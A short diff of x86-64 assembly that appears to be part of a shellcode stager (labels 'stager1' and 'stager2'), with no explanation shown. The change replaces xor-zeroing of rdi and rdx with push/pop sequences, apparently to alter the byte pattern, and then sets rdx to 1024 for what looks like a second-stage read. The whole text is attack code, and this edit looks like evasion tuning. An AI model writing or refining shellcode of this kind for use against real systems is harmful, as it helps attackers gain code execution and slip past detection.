@@ -7,8 +7,10 @@ pc:
     jmp stager2
 stager1:
     xor rax,rax
-    xor rdi,rdi
-    xor rdx,rdx
+    push rax
+    pop rdi
+    push rax
+    pop rdx
     inc rdx
     shl rdx,10
     call pc
